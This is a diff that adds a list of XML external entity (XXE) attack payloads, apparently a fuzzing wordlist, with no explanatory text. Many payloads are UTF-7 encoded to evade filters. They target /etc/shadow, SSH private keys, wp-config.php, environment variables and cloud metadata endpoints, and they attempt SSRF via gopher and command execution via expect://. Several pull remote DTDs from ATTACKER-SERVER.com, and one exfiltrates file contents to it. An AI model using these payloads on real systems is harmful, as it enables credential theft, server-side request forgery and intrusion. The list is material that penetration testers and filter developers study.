@@ -1,0 +1,32 @@
++ADw?xml version=+ACI-1.0+ACI- encoding=+ACI-UTF-7+ACI-?+AD4APAA-DOCTYPE foo+AFs AJAA-ELEMENT foo ANY +AD4APAA-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4AXQA+PHg+ACY-xxe+ADsAPA-/x+AD4-
++ADw?xml version=+ACI-1.0+ACI- encoding=+ACI-UTF-7+ACI-?+AD4APAA-DOCTYPE foo+AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///etc/shadow+ACI- +AD4AXQAgPGZvbz4mI3h4ZTsgPC9mb28+
++ADw?xml version=+ACI-1.0+ACI-?+AD4APAA-DOCTYPE foo +AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///c:/windows/win.ini+ACI APgBdAD4APABmAG8AbwA+ACYAeAB4AGUAOwA8AC8AZgBvAG8APg-
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%xxe;]><foo>test</foo>
++ADw?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?+AD4APAA-DOCTYPE root +AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACIAPgBdAD4APAByAG8AbwB0AD4AJgB4AHgAZQA7ADwALwByAG8AbwB0AD4-
++ADw?xml version+AD0AIg-1.0+ACI APgA8-DOCTYPE data +AFs AJAA-ENTITY file SYSTEM +ACI-file:///etc/hosts+ACIAPgBdAD4APABkAGEAdABhAD4AJgBmAGkAbABlADsAPAAvAGQAYQB0AGEAPg-
++ADwAIQ-DOCTYPE foo+AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///proc/self/environ+ACIAPgBdAD4APABmAG8AbwA+ACYAeAB4AGUAOwA8AC8AZgBvAG8APg-
++ADw?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACIAPwA+ADwAIQ-DOCTYPE test+AFs AJAA-ELEMENT test ANY+AD4APAA-ENTITY xxe SYSTEM +ACI-file:///var/log/apache2/access.log+ACIAPgBdAD4APAByAG8AbwB0AD4AJgB4AHgAZQA7ADwALwByAG8AbwB0AD4-
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
++ADw?xml version+AD0AIg-1.0+ACI APgA8-DOCTYPE foo+AFs AJAA-ENTITY+ACU- xxe SYSTEM +ACI-http://ATTACKER-SERVER.com/xxe.dtd+ACIAPgAlAHgAeABlADsAXQA+ADwAZgBvAG8APgB0AGUAcwB0ADwALwBmAG8AbwA+
++ADwAIQ-DOCTYPE root +AFs AJAA-ENTITY+ACU- file SYSTEM +ACI-file:///etc/passwd+ACIAPgA8ACEARABUAFkAUABFACAAZAB0AGQAIABbADwAIQBFAE4AVABJAFQAWQAgACUAIABzAGUAbgBkACAAUwBZAFMAVABFAE0AIAAiAGgAdAB0AHAAOgAvAC8AQQBUAFQAQQBDAFMARQBSAC0AUwBFAFIAVgBFAFIALgBjAG8AbQAvAD8AZABhAHQAYQA9ACUAZgBpAGwAZQA7ACIA+ABdAD4AJQBkAHQAZAA7ACUAcwBlAG4AZAA7AF0-
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]><foo>&xxe;</foo>
++ADw?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACIAPwA+ADwAIQ-DOCTYPE data+AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///var/www/html/config.php+ACIAPgBdAD4APABkAGEAdABhAD4AJgB4AHgAZQA7ADwALwBkAGEAdABhAD4-
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><foo>&xxe;</foo>
++ADw?xml version+AD0AIg-1.0+ACI APgA8-DOCTYPE root+AFs AJAA-ENTITY xxe SYSTEM +ACI-http://127.0.0.1:8080+ACIAPgBdAD4APAByAG8AbwB0AD4AJgB4AHgAZQA7ADwALwByAG8AbwB0AD4-
++ADw?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACIAPwA+ADwAIQ-DOCTYPE foo+AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///c:/windows/system32/drivers/etc/hosts+ACIAPgBdAD4APABmAG8AbwA+ACYAeAB4AGUAOwA8AC8AZgBvAG8APg-
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">]><foo>&xxe;</foo>
++ADwAIQ-DOCTYPE test+AFs AJAA-ENTITY xxe SYSTEM +ACI-file:///proc/version+ACIAPgBdAD4APAByAG8AbwB0AD4AJgB4AHgAZQA7ADwALwByAG8AbwB0AD4-
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>
++ADw?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACIAPwA+ADwAIQ-DOCTYPE foo+AFs AJAA-ENTITY+ACU- dtd SYSTEM +ACI-http://ATTACKER-SERVER.com/evil.dtd+ACIAPgAlAGQAdABkADsAXQA+ADwAZgBvAG8APgB0AGUAcwB0ADwALwBmAG8AbwA+
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:9000">]><foo>&xxe;</foo>
++ADw?xml version+AD0AIg-1.0+ACIAPwA+ADwAIQ-DOCTYPE data+AFs AJAA-ENTITY file SYSTEM +ACI-file:///c:/inetpub/wwwroot/web.config+ACIAPgBdAD4APABkAGEAdABhAD4AJgBmAGkAbABlADsAPAAvAGQAYQB0AGEAPg-
